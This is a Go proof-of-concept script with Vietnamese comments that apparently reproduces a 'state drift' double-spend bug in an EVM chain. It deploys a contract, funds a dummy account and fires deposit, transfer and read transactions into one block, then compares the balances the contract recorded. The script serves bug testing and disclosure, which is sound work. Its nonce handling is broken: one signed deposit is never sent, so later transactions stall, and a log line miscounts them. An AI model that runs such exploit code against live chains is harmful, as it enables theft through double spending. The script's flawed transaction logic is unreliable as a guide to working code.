//go:build ignore

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

type Config struct {
	RPCUrl     string `json:"rpc_url"`
	Address    string `json:"address"`
	PrivateKey string `json:"private_key"`
	ChainID    int64  `json:"chain_id"`
}

func waitReceipt(client *ethclient.Client, txHash common.Hash) (*types.Receipt, error) {
	fmt.Printf("Đang chờ receipt cho tx %s...\n", txHash.Hex())
	timeout := time.After(60 * time.Second)
	for {
		select {
		case <-timeout:
			return nil, fmt.Errorf("timeout")
		default:
			receipt, err := client.TransactionReceipt(context.Background(), txHash)
			if err == nil {
				if receipt.Status == 1 {
					fmt.Printf("✅ Tx %s THÀNH CÔNG (Status: 1)\n", txHash.Hex())
				} else {
					fmt.Printf("❌ Tx %s THẤT BẠI (Status: 0 - Bị Revert)\n", txHash.Hex())
				}
				return receipt, nil
			}
			time.Sleep(500 * time.Millisecond)
		}
	}
}

func main() {
	rawConfig, err := os.ReadFile("config.json")
	if err != nil {
		log.Fatal(err)
	}
	var cfg Config
	if err := json.Unmarshal(rawConfig, &cfg); err != nil {
		log.Fatal(err)
	}

	client, err := ethclient.Dial(cfg.RPCUrl)
	if err != nil {
		log.Fatal(err)
	}

	masterKey, err := crypto.HexToECDSA(strings.TrimPrefix(cfg.PrivateKey, "0x"))
	if err != nil {
		log.Fatal(err)
	}
	masterAddr := crypto.PubkeyToAddress(masterKey.PublicKey)
	fmt.Printf("Master Address: %s\n", masterAddr.Hex())

	// 1. Đọc byte code & ABI mới
	fmt.Println("\n🚀 [1] Đọc Smart Contract ABI...")
	binData, err := os.ReadFile("test_drift_BalanceChecker.bin")
	if err != nil {
		log.Fatal(err)
	}
	bytecode := common.FromHex(strings.TrimSpace(string(binData)))
	abiData, err := os.ReadFile("test_drift_BalanceChecker.abi")
	if err != nil {
		log.Fatal(err)
	}
	parsedABI, _ := abi.JSON(strings.NewReader(string(abiData)))

	// 2. Deploy Contract
	fmt.Println("\n🚀 [2] Đang Deploy Smart Contract bằng masterKey...")
	nonceMaster, _ := client.PendingNonceAt(context.Background(), masterAddr)
	gasPrice, _ := client.SuggestGasPrice(context.Background())
	deployTx := types.NewContractCreation(nonceMaster, big.NewInt(0), 3000000, gasPrice, bytecode)
	signedDeploy, _ := types.SignTx(deployTx, types.NewEIP155Signer(big.NewInt(cfg.ChainID)), masterKey)
	err = client.SendTransaction(context.Background(), signedDeploy)
	if err != nil {
		fmt.Printf("❌ Deploy thất bại: %v\n", err)
		return
	}
	receipt, err := waitReceipt(client, signedDeploy.Hash())
	if err != nil || receipt.Status != 1 {
		log.Fatal("Deploy thất bại")
	}
	contractAddr := receipt.ContractAddress
	fmt.Printf("✅ Đã deploy Smart Contract tại: %s\n", contractAddr.Hex())

	bal, _ := client.BalanceAt(context.Background(), masterAddr, nil)
	fmt.Printf("✅ Số dư Master hiện tại: %s wei\n", bal.String())

	// 3. Tự động chạy register_bls để tạo dummyReceiver mới
	fmt.Println("\n🚀 [3] Tự động chạy register_bls để tạo dummyReceiver mới...")
	cmd := exec.Command("go", "run", "main.go", "-count", "1")
	cmd.Dir = "../../../register_bls"
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("❌ Lỗi khi chạy lệnh tạo BLS key: %v", err)
	}

	// Đọc dummyReceiver từ bls_keys.json
	blsKeysData, err := os.ReadFile("../../../register_bls/bls_keys.json")
	if err != nil {
		log.Fatalf("❌ Không thể đọc bls_keys.json: %v", err)
	}
	var keys []struct {
		PrivateKey string `json:"private_key"`
	}
	if err := json.Unmarshal(blsKeysData, &keys); err != nil || len(keys) == 0 {
		log.Fatalf("❌ Parse bls_keys.json thất bại hoặc mảng rỗng")
	}
	dummyReceiverKey, err := crypto.HexToECDSA(keys[0].PrivateKey)
	if err != nil {
		log.Fatalf("❌ Parse private key từ bls_keys.json thất bại: %v", err)
	}
	dummyReceiverAddr := crypto.PubkeyToAddress(dummyReceiverKey.PublicKey)

	// 4. Master chuyển 10 coin cho dummyReceiver
	fmt.Println("\n🚀 [4] Master chuyển 10 coin cho dummyReceiver...")
	nonceMaster, _ = client.PendingNonceAt(context.Background(), masterAddr)
	transferAmount := new(big.Int).Exp(big.NewInt(10), big.NewInt(18), nil)
	transferAmount.Mul(transferAmount, big.NewInt(10)) // 10 coin
	txTransfer := types.NewTransaction(nonceMaster, dummyReceiverAddr, transferAmount, 21000, gasPrice, nil)
	signedTxTransfer, _ := types.SignTx(txTransfer, types.NewEIP155Signer(big.NewInt(cfg.ChainID)), masterKey)
	err = client.SendTransaction(context.Background(), signedTxTransfer)
	if err != nil {
		log.Fatalf("❌ Lỗi chuyển 10 coin: %v", err)
	}
	waitReceipt(client, signedTxTransfer.Hash())

	dummyBal, _ := client.BalanceAt(context.Background(), dummyReceiverAddr, nil)
	fmt.Printf("✅ Số dư dummyReceiver hiện tại: %s wei\n", dummyBal.String())

	// 5. KỊCH BẢN TẤN CÔNG STATE DRIFT TỪ DUMMY RECEIVER
	fmt.Println("\n🚀 [5] CHUẨN BỊ BẮN 3 GIAO DỊCH TỪ DUMMY RECEIVER ĐỂ TÁI HIỆN STATE DRIFT BUG...")

	nonceDummy, _ := client.PendingNonceAt(context.Background(), dummyReceiverAddr)

	// Tx 1: dummyReceiver gọi deposit(1 coin) -> Contract sẽ lưu bal1 = msg.sender.balance
	depositAmount := new(big.Int).Exp(big.NewInt(10), big.NewInt(18), nil) // 1 coin = 10^18 wei
	dataDeposit, _ := parsedABI.Pack("deposit")
	tx1 := types.NewTransaction(nonceDummy, contractAddr, depositAmount, 100000, gasPrice, dataDeposit)
	signedTx1, _ := types.SignTx(tx1, types.NewEIP155Signer(big.NewInt(cfg.ChainID)), dummyReceiverKey)

	nonceDummy++
	tx1_1 := types.NewTransaction(nonceDummy, contractAddr, depositAmount, 100000, gasPrice, dataDeposit)
	signedTx1_1, _ := types.SignTx(tx1_1, types.NewEIP155Signer(big.NewInt(cfg.ChainID)), dummyReceiverKey)

	// Tx 2: dummyReceiver chuyển 8 coin trả lại cho Master
	nonceDummy++
	returnAmount := new(big.Int).Exp(big.NewInt(10), big.NewInt(18), nil)
	returnAmount.Mul(returnAmount, big.NewInt(8)) // 8 coin
	tx2 := types.NewTransaction(nonceDummy, masterAddr, returnAmount, 21000, gasPrice, nil)
	signedTx2, _ := types.SignTx(tx2, types.NewEIP155Signer(big.NewInt(cfg.ChainID)), dummyReceiverKey)

	// Tx 3: dummyReceiver gọi step3() -> Đọc lại số dư lưu vào bal3
	nonceDummy++
	data3, _ := parsedABI.Pack("step3")
	tx3 := types.NewTransaction(nonceDummy, contractAddr, big.NewInt(0), 100000, gasPrice, data3)
	signedTx3, _ := types.SignTx(tx3, types.NewEIP155Signer(big.NewInt(cfg.ChainID)), dummyReceiverKey)

	// BẮN SONG SONG (CÙNG 1 BLOCK)
	fmt.Println("Đang gửi ĐỒNG LOẠT 3 Tx để ép chúng vào cùng 1 Block...")

	if err := client.SendTransaction(context.Background(), signedTx1); err != nil {
		fmt.Printf("❌ Lỗi khi gửi Tx 1: %v\n", err)
		return
	}
	if err := client.SendTransaction(context.Background(), signedTx2); err != nil {
		fmt.Printf("❌ Lỗi khi gửi Tx 2: %v\n", err)
		return
	}
	if err := client.SendTransaction(context.Background(), signedTx3); err != nil {
		fmt.Printf("❌ Lỗi khi gửi Tx 3: %v\n", err)
		return
	}

	fmt.Println("⏳ Đang đợi cả 4 Tx được đóng block (cùng lúc)...")
	rcpt1, err1 := waitReceipt(client, signedTx1.Hash())
	if err1 != nil || rcpt1.Status == 0 {
		fmt.Printf("❌ Tx 1 thất bại hoặc timeout: %v\n", err1)
	} else {
		fmt.Printf("✅ Tx 1 (Deposit): BlockNumber = %v, TxIndex = %v\n", rcpt1.BlockNumber, rcpt1.TransactionIndex)
	}

	rcpt1_1, err1_1 := waitReceipt(client, signedTx1_1.Hash())
	if err1_1 != nil || rcpt1_1.Status == 0 {
		fmt.Printf("❌ Tx 1_1 thất bại hoặc timeout: %v\n", err1_1)
	} else {
		fmt.Printf("✅ Tx 1_1 (Deposit): BlockNumber = %v, TxIndex = %v\n", rcpt1_1.BlockNumber, rcpt1_1.TransactionIndex)
	}

	rcpt2, err2 := waitReceipt(client, signedTx2.Hash())
	if err2 != nil || rcpt2.Status == 0 {
		fmt.Printf("❌ Tx 2 thất bại hoặc timeout: %v\n", err2)
	} else {
		fmt.Printf("✅ Tx 2 (Native): BlockNumber = %v, TxIndex = %v\n", rcpt2.BlockNumber, rcpt2.TransactionIndex)
	}

	rcpt3, err3 := waitReceipt(client, signedTx3.Hash())
	if err3 != nil || rcpt3.Status == 0 {
		fmt.Printf("❌ Tx 3 thất bại hoặc timeout: %v\n", err3)
	} else {
		fmt.Printf("✅ Tx 3 (Read): BlockNumber = %v, TxIndex = %v\n", rcpt3.BlockNumber, rcpt3.TransactionIndex)
	}

	// KIỂM TRA
	fmt.Println("\n🔍 KIỂM TRA KẾT QUẢ DOUBLE SPEND:")

	// Gọi contract để lấy bal1 và bal3 bằng ABI Pack
	bal1Data, _ := parsedABI.Pack("bal1")
	bal3Data, _ := parsedABI.Pack("bal3")
	bal1Bytes, err1 := client.CallContract(context.Background(), ethereum.CallMsg{To: &contractAddr, Data: bal1Data}, nil)
	bal3Bytes, err2 := client.CallContract(context.Background(), ethereum.CallMsg{To: &contractAddr, Data: bal3Data}, nil)

	if err1 != nil || err2 != nil {
		fmt.Printf("❌ Lỗi CallContract: err1=%v, err2=%v\n", err1, err2)
	}

	if len(bal1Bytes) > 0 && len(bal3Bytes) > 0 {
		bal1EVM := new(big.Int).SetBytes(bal1Bytes)
		bal3EVM := new(big.Int).SetBytes(bal3Bytes)

		bal1Coin := new(big.Float).Quo(new(big.Float).SetInt(bal1EVM), big.NewFloat(1e18))
		returnAmountCoin := new(big.Float).Quo(new(big.Float).SetInt(returnAmount), big.NewFloat(1e18))
		bal3Coin := new(big.Float).Quo(new(big.Float).SetInt(bal3EVM), big.NewFloat(1e18))

		fmt.Printf("💰 Số dư Dummy EVM nhìn thấy ở Tx 1 (bal1 - lúc deposit): %s coin (%s wei)\n", bal1Coin.Text('f', 18), bal1EVM.String())
		fmt.Printf("👉 Số tiền Tx 2 (Native Transfer) chuyển lại Master: %s coin (%s wei)\n", returnAmountCoin.Text('f', 18), returnAmount.String())
		fmt.Printf("💰 Số dư Dummy EVM nhìn thấy ở Tx 3 (bal3 - gọi sau cùng): %s coin (%s wei)\n", bal3Coin.Text('f', 18), bal3EVM.String())

		if bal3EVM.Cmp(bal1EVM) == 0 || bal3EVM.Cmp(new(big.Int).Sub(bal1EVM, depositAmount)) >= 0 {
			fmt.Println("❌ PHÁT HIỆN BUG (STATE DRIFT): EVM đã đọc cache cũ! Số dư Dummy không bị giảm đi 8 coin sau Tx 2!")
		} else {
			fmt.Println("✅ KHÔNG THẤY BUG: EVM đã nhìn thấy số dư giảm xuống.")
		}
	}
}
